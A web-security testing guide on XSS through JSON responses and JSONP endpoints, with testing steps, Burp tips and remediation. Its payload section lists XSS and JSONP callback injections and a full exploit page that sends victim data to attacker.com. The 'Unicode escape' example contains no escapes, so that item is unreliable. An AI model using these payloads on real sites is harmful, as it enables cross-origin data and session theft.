# XSS in JSON Responses

## Overview
XSS in JSON responses occurs when user-controlled data is embedded in a JSON API response without proper encoding, and that response is rendered in a browser context that interprets it as HTML. This most commonly arises when JSON responses are returned without a strict `Content-Type: application/json` header (allowing browsers to sniff them as HTML), when JSON data is directly interpolated into HTML templates on the client side without sanitization, or when JSONP endpoints wrap attacker-controlled callbacks around JSON data.

## How It Works
There are three main attack scenarios. First, a server returns JSON with `Content-Type: text/html` (or no content type), causing the browser to render it as HTML and execute embedded scripts. Second, a JavaScript frontend fetches JSON and inserts values from it directly into the DOM using `innerHTML` or similar sinks without encoding — the JSON content acts as the delivery vehicle for stored or reflected XSS. Third, JSONP endpoints (`?callback=functionName`) reflect the callback parameter directly, allowing an attacker to inject arbitrary JavaScript in the callback name. Each scenario results in JavaScript execution in the target origin's context.

## Impact
- Script execution in the origin of the API or application
- Session token theft if cookies lack HttpOnly
- JSONP abuse for cross-origin data theft (pre-CORS APIs)
- Chained with reflected or stored XSS via API responses consumed by the frontend
- Content injection into single-page applications that trust API data
- CSRF token extraction from API responses consumed by controlled JS

## Where to Look
- API endpoints that return JSON containing user-supplied data: search results, profile info, messages
- Response `Content-Type` header — check if it says `text/html` or is missing for JSON responses
- JSONP endpoints: look for `?callback=`, `?jsonp=`, `?cb=` parameters
- Frontend JavaScript that reads JSON responses and writes to `innerHTML`, `document.write`, or jQuery `.html()`
- Angular, React, or Vue applications that use `dangerouslySetInnerHTML`, `v-html`, or `[innerHTML]` bindings with API data
- Error responses that echo request data as JSON values
- API responses wrapped in `<pre>` or `<code>` tags on documentation or test pages

## Testing Steps
1. Identify API endpoints that return JSON containing user-controlled values.
2. Check the `Content-Type` response header — if it is not `application/json`, test for browser HTML rendering.
3. Submit an XSS probe (`<script>alert(1)</script>`) as a JSON field value and inspect the raw response.
4. Load the API URL directly in a browser — if the browser renders HTML, the payload may execute.
5. Identify JSONP endpoints by searching for `callback`, `jsonp`, `cb`, `fn` parameters in requests.
6. For JSONP, set the callback to a JavaScript expression: `?callback=alert(1)//` or `?callback=alert%281%29`.
7. Trace how the frontend consumes JSON responses — look for unsafe DOM writes in JavaScript source code.
8. For each unsafe DOM write, confirm whether the JSON value is attacker-controlled and unsanitized.
9. Attempt to inject HTML/JavaScript into the API input that populates those fields and verify client-side execution.

## Payloads / Techniques

**JSON response without proper Content-Type (rendered as HTML):**
```json
{"error": "<script>alert(document.domain)</script>"}
```
If the response is returned with `Content-Type: text/html`, the browser executes the script.

**JSONP callback injection:**
```
GET /api/user?callback=alert(1)//
GET /api/data?callback=alert`1`
GET /api/search?cb=};alert(1);//
GET /api/feed?jsonp=<script>alert(1)</script>//
```

Server response with injected callback:
```javascript
alert(1)//({"user":"john","email":"john@example.com"});
```

**JSONP full exploit HTML (cross-origin data theft):**
```html
<html>
<body>
<script>
function stealData(data) {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(data)));
}
</script>
<script src="https://victim.com/api/userdata?callback=stealData"></script>
</body>
</html>
```

**When frontend uses innerHTML with JSON data:**
```json
{"username": "<img src=x onerror=alert(document.cookie)>"}
```
Payload stored in the username field fires when the profile is rendered client-side via unsafe DOM insertion.

**JSON with Unicode escape to bypass filters:**
```json
{"name": "<script>alert(1)</script>"}
```
If the frontend decodes Unicode escapes before inserting into the DOM, the payload executes.

**Breaking out of JSON string into JavaScript context:**
If JSON is embedded directly in a `<script>` block:
```html
<script>var data = {"name": "INJECT"};</script>
```
Payload:
```
{"name": "test\"; alert(1); //"}
```

**cURL to test JSON content-type:**
```bash
curl -i 'https://victim.com/api/search?q=<script>alert(1)</script>'
# Check: Content-Type in response, and whether payload appears unencoded
```

**JSONP via cURL:**
```bash
curl 'https://victim.com/api/data?callback=alert(1)//'
# Response should look like: alert(1)//({"...data..."})
```

## Burp Suite Tips
- In **Burp Proxy**, filter the HTTP history by response type and look for JSON responses — check their `Content-Type` headers in the **Response** tab.
- Use **Burp Repeater** to modify JSON field values to XSS payloads and observe whether the response contains unencoded HTML.
- Use **Burp's Search** feature (Ctrl+F in a response) to find where your payload appears in JSON responses.
- Check the **MIME type** in Burp's response tab — if Burp displays the response as "HTML" when you expected "JSON", the Content-Type is wrong.
- Use the **JS Link Finder** or **GAP** Burp extension to enumerate API endpoints and JavaScript source files.
- Search all JS files for `innerHTML`, `.html(`, `dangerouslySetInnerHTML` to find where API data is unsafely rendered.
- For JSONP, search in HTTP history for parameters named `callback`, `cb`, `jsonp`, `fn`, `call`.

## Tools
- Burp Suite Pro
- JS Miner (Burp extension) — discovers API endpoints in JS files
- GAP (Get All Parameters) Burp extension
- ffuf / wfuzz (fuzzing callback parameter values)
- LinkFinder — https://github.com/GerbenJavado/LinkFinder
- Retire.js (check for vulnerable JSONP-using libraries)
- Chrome DevTools — Network tab, filter by XHR/Fetch to see all API calls

## Remediation
- **Set correct Content-Type**: Always return `Content-Type: application/json` (not `text/html`) for JSON responses. Add `X-Content-Type-Options: nosniff` to prevent MIME sniffing.
- **JSON-encode all values**: Use a proper JSON serialization library — never manually build JSON strings. Library serializers automatically escape special characters.
- **Deprecate JSONP**: Replace JSONP endpoints with CORS-enabled JSON endpoints. If JSONP must be used, whitelist callback function names against a strict pattern (alphanumeric only) and reject any callback containing non-alphanumeric characters.
- **Frontend sanitization**: When consuming API data and inserting into the DOM, use `textContent` instead of `innerHTML`. If HTML is required, sanitize with DOMPurify.
- **Avoid dangerous bindings**: In React, never use `dangerouslySetInnerHTML` with API data. In Vue, avoid `v-html` with untrusted content. In Angular, avoid bypassing the built-in sanitizer.
- **CSP**: Deploy a strict CSP to mitigate the impact of XSS even if an encoding flaw exists.

## References
https://portswigger.net/web-security/cross-site-scripting
https://portswigger.net/research/json-hijacking-for-the-modern-web
https://owasp.org/www-community/attacks/JSONP
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
